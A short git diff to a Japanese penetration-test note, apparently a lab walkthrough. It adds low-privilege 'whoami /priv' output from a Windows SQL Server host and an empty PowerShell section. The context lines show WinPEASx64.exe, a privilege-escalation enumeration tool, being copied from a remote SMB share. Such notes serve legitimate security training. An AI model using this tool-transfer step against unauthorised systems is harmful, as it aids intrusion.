@@ -52,7 +52,15 @@ copy \\172.16.104.206\Transfer\WinPEASx64.exe .
 ### 実行結果抽出
 
 ```powershell
+PS C:\Program Files\Microsoft SQL Server> whoami /priv
 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
 ---
@@ -78,6 +86,9 @@ copy \\172.16.104.206\Transfer\WinPEASx64.exe .
 
 ### インストール済みアプリケーション
 
+```powershell
+
+```
 
 ---
 
